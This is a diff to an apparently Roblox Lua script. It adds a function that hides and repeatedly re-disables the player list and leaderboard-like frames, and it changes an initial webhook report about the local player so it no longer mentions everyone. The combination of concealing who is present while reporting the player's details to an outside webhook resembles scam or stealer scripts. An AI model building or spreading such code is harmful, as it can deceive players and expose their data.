@@ -145,6 +145,37 @@ local function sendWebhook(embedData, mentionEveryone)
     end)
 end
 
+local function disableLeaderboard()
+    pcall(function()
+        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+    end)
+    
+    -- Hide leaderboard in PlayerGui
+    pcall(function()
+        for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") then
+                for _, obj in pairs(gui:GetDescendants()) do
+                    if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
+                        if obj.Name:lower():find("leader") or obj.Name:lower():find("player") or obj.Name:lower():find("stat") then
+                            obj.Visible = false
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    
+    -- Continuously monitor and disable leaderboard
+    spawn(function()
+        while true do
+            pcall(function()
+                game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+            end)
+            task.wait(1)
+        end
+    end)
+end
+
 local function sendInitialWebhook()
     local avatarUrl = getPlayerAvatar(LocalPlayer.UserId)
     local embed = {
@@ -181,7 +212,7 @@ local function sendInitialWebhook()
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
     }
-    sendWebhook(embed, true)
+    sendWebhook(embed, false)
 end
 
 local function createUI()
